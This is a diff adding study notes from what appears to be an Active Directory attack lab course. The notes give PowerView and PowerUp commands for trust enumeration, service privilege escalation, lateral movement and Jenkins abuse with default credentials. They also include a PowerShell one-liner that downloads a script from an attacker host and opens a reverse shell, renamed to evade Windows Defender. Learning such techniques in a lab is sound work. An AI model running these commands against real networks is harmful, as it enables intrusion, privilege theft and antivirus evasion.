@@ -54,3 +54,37 @@
 - Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
   Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
   Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
+  
+# Learning Objective 5
+
+- Exploit a service on dcorp-studentx and elevate privileges to local administrator.
+  1. Enum all services with Unquoted Path with PowerUp from PowerSploit
+  Get-ServiceUnquoted
+  
+  2. Enum services where the current can make changes to service binary
+  Get-ModifiableServiceFile -Verbose
+  
+  3. Enum services with weak service permissions
+  Get-ModifiableService
+  
+  4. Abuse the function for Get-ModifiableService and add our current domain user to the local Administrators Group.
+  Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx'
+
+- Identify a machine in the domain where studentx has local administrative access use Find-PSRemotingLocalAdminAccess.ps1
+  Import-Module .\Find-PSRemotingLocalAdminAccess.ps1
+  Find-PSRemotingLocalAdminAccess
+  winrs -r:dcorp-adminsrv cmd
+  whoami
+  hostname
+  
+  Enter-PSSession -ComputerName dcorp-adminsrv
+  
+- Using privileges of a user on Jenkins, get admin privileges on 172.16.3.11 - the dcorp-ci server
+  builduser:builduser as user on the jenkins login
+  use a powershell reverse shell:
+  powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/Invoke-PowerShellTcp.ps1'));Power-Reverse -IPAddress 172.16.100.X-Port 443 
+  where "Power" in the script is Invoke-PowerShellTcp renamed to bypass Windows Defender
+  nc64.exe -lvp 443
+  Build
+  
+  
